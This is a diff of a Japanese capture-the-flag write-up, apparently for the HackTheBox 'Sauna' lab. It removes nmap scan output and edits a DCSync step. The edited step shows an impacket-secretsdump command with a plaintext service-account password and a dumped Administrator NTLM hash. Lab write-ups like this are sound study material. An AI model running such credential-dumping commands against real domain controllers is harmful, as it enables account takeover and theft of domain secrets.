@@ -27,37 +27,6 @@ Open 10.129.95.180:49685
 Open 10.129.95.180:49692
 10.129.95.180 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49685,49692]
 ```
-```sh
-└─$ nmap -n -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49675,49674,49696 -sV 10.129.95.180
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 02:26 EDT
-Nmap scan report for 10.129.95.180
-Host is up (0.47s latency).
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 13:26:24Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-9389/tcp  open  mc-nmf        .NET Message Framing
-49668/tcp open  msrpc         Microsoft Windows RPC
-49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49674/tcp open  msrpc         Microsoft Windows RPC
-49675/tcp open  msrpc         Microsoft Windows RPC
-49696/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 66.47 seconds
-```
 
 
 ## STEP 2
@@ -439,18 +408,12 @@ autologonから、svc_loanmgr のパスワード判明！
 ```
 ということで、svc_loanmgrでDCSync攻撃！
 ```sh
-└─$ impacket-secretsdump -ts -just-dc-ntlm 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
+└─$ impacket-secretsdump -ts -just-dc-user administrator -just-dc-ntlm 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [2025-08-08 11:19:51] [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [2025-08-08 11:19:51] [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
-EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
-EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
-EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
-SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7504784e68bb600a12667dc85792f5c1:::
 [2025-08-08 11:20:03] [*] Cleaning up...
 ```
 administratorでログイン成功！ルートフラグゲット！
